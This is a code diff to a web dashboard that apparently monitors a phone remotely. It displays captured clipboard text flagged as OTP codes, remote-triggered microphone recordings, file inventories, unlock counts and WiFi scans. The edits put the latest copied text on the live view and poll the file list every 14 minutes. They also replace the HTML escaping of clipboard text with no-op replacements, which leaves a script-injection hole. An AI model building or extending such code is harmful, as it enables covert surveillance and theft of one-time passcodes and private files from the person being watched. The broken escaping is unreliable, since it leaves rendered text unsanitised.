@@ -299,7 +299,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <button class="tab-btn" data-tab="wifi">&#x1F4E1; WiFi</button>
 <button class="tab-btn" data-tab="logcat">&#x1F4DD; Logcat</button>
 <button class="tab-btn" data-tab="health">&#x1F4AA; Health</button>
-<button class="tab-btn" data-tab="clipboard">&#x1F4CB; Clipboard</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -352,6 +351,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swUptime">&#x23F1; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swUnlocks">&#x1F513; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swScreen">&#x1F4F1; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swClipboard">&#x1F4CB; --</span>
 </div>
 <div class="card" style="border-left-color:var(--accent);padding:12px;margin-top:8px">
   <div style="font-size:15px;font-weight:500;margin-bottom:8px">&#x1F4E1; Remote Sync Trigger</div>
@@ -630,14 +630,6 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 </div>
 <div id="storageOverview" style="margin-bottom:14px"></div>
 <div style="border-top:1px solid var(--border);padding-top:10px;margin-bottom:14px">
-  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-    <span style="font-size:15px;font-weight:500">&#x1F4C1; File Inventory — Downloads / Documents</span>
-    <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollFileInventory()">&#x1F504; Refresh</span>
-  </div>
-  <div style="font-size:12px;color:var(--muted);margin-bottom:6px">Hourly snapshot from device (name, size, date, folder). No file content is uploaded.</div>
-  <div id="fileInventoryList"><div class="label">No file inventory yet</div></div>
-</div>
-<div style="border-top:1px solid var(--border);padding-top:10px">
   <div style="font-size:15px;font-weight:500;margin-bottom:8px">&#x1F9F9; Cleanup Actions</div>
   <div id="cleanupActions" style="display:flex;flex-direction:column;gap:6px"></div>
 </div>
@@ -683,6 +675,8 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 </label>
 <span id="logcatToggleStatus" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
 </div>
+<div style="font-size:12px;color:var(--muted);margin-bottom:6px">14 min snapshot from device (name, size, date, folder). No file content is uploaded.</div>
+<div id="fileInventoryList"><div class="label">No file inventory yet</div></div>
 <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap">
 <select id="logcatFilter" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:6px;font-size:13px">
 <option value="">All</option>
@@ -769,14 +763,6 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div id="medicationAdherence" style="margin-bottom:12px"></div>
 <div id="medicationList" style="display:flex;flex-direction:column;gap:8px"></div>
 </div>
-</div>
-<div id="tab-clipboard">
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-  <span style="font-size:16px;font-weight:500">&#x1F4CB; Clipboard History</span>
-  <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollClipboard()">&#x1F504; Refresh</span>
-</div>
-<div style="font-size:12px;color:var(--muted);margin-bottom:8px">Live clipboard snapshots from device (polled ~30s when screen on). Shows last copied text, length, and OTP hint.</div>
-<div id="clipboardList"><div class="label">No clipboard data yet</div></div>
 </div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
@@ -1965,7 +1951,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'videos') { renderVideosFromCache(); pollVideos(); }
     if (btn.dataset.tab === 'recents') pollAppSnapshots();
     if (btn.dataset.tab === 'wifi') pollWifiScans();
-    if (btn.dataset.tab === 'logcat') { pollLogcat(); pollLogcatToggleState(); }
+    if (btn.dataset.tab === 'logcat') { pollLogcat(); pollLogcatToggleState(); pollFileInventory(); }
     if (btn.dataset.tab === 'health') pollHealth();
     if (btn.dataset.tab === 'voice') { renderVoiceNotes(); pollVoiceNotes(); }
     if (btn.dataset.tab === 'remote') { renderRemoteRecordings(); pollRemoteRecordings(); }
@@ -2716,7 +2702,7 @@ function startPolling() {
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('videos', 60000, pollVideos);
   schedulePoll('clipboard', intervals.clipboard, pollClipboard);
-  schedulePoll('files', intervals.files, pollFileInventory);
+  schedulePoll('files', 14 * 60 * 1000, pollFileInventory);
 }
 
 function schedulePoll(name, interval, fn) {
@@ -2936,6 +2922,13 @@ async function pollMeta() {
       const mins = Math.round(m.totalScreenMs / 60000);
       const h = Math.floor(mins/60), mm = mins % 60;
       swSc.textContent = '\u{1F4F1} ' + (h ? h + 'h ' + mm + 'm' : mm + 'm screen');
+    }
+    const swClip = document.getElementById('swClipboard');
+    if (swClip && m.clipboardLastText) {
+      const txt = m.clipboardLastText.length > 20 ? m.clipboardLastText.substring(0, 20) + '...' : m.clipboardLastText;
+      swClip.textContent = '\u{1F4CB} ' + (txt.length > 0 ? txt : '--');
+      swClip.style.borderColor = 'var(--accent)';
+      swClip.style.color = 'var(--muted)';
     }
   } catch {}
   if (m.deviceModel && devices[selectedDevice]) {
@@ -7906,16 +7899,31 @@ async function pollClipboard() {
   try {
     const data = await fetchRTDB(`devices/${selectedDevice}/clipboardHistory`, 'orderBy=%22ts_ms%22&limitToLast=50');
     const el = document.getElementById('clipboardList');
+    const swClip = document.getElementById('swClipboard');
     if (!el) return;
-    if (!data || typeof data !== 'object' || data === null) { el.innerHTML = '<div class="label">No clipboard data yet</div>'; return; }
+    if (!data || typeof data !== 'object' || data === null) { 
+      if (swClip) swClip.textContent = '\u{1F4CB} --';
+      el.innerHTML = '<div class="label">No clipboard data yet</div>'; 
+      return; 
+    }
     const entries = Object.values(data).filter(v => v && v.text).sort((a,b)=> (parseInt(b.ts_ms||'0') - parseInt(a.ts_ms||'0')));
-    if (!entries.length) { el.innerHTML = '<div class="label">No clipboard data yet</div>'; return; }
+    if (!entries.length) { 
+      if (swClip) swClip.textContent = '\u{1F4CB} --';
+      el.innerHTML = '<div class="label">No clipboard data yet</div>'; 
+      return; 
+    }
+    // Update Live tab chip with latest text
+    const latest = entries[0];
+    const t = latest.text || '';
+    const display = t.length > 20 ? t.substring(0, 20) + '...' : t;
+    if (swClip) swClip.textContent = '\u{1F4CB} ' + (display.length > 0 ? display : '--');
+    
     el.innerHTML = entries.map(e => {
       const ts = parseInt(e.ts_ms||'0'); const t = e.text || '';
-      const esc = t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+      const esc = t.replace(/&/g,'&').replace(/</g,'<').replace(/>/g,'>');
       const otpBadge = e.isOtp ? '<span class="chip" style="background:var(--warning);color:#000;font-size:10px;margin-left:6px">OTP</span>' : '';
       const len = e.len || t.length;
-      return `<div class="card" style="border-left-color:var(--accent)"><div class="time">${pkt(ts)} \u00B7 ${len} chars${otpBadge}</div><div style="font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;background:var(--bg);padding:8px 10px;border-radius:6px;margin-top:6px;border:1px solid var(--border)">${esc}</div><div style="margin-top:6px"><span class="chip" style="cursor:pointer" onclick="navigator.clipboard&&navigator.clipboard.writeText(${JSON.stringify(t).replace(/"/g,'&quot;')}).then(()=>showAlert('Copied','ok'))">&#x1F4CB; Copy</span></div></div>`;
+      return `<div class="card" style="border-left-color:var(--accent)"><div class="time">${pkt(ts)} \u00B7 ${len} chars${otpBadge}</div><div style="font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;background:var(--bg);padding:8px 10px;border-radius:6px;margin-top:6px;border:1px solid var(--border)">${esc}</div><div style="margin-top:6px"><span class="chip" style="cursor:pointer" onclick="navigator.clipboard&&navigator.clipboard.writeText(${JSON.stringify(t).replace(/"/g,'"')}).then(()=>showAlert('Copied','ok'))">&#x1F4CB; Copy</span></div></div>`;
     }).join('');
   } catch(e) { console.error('pollClipboard', e); }
 }
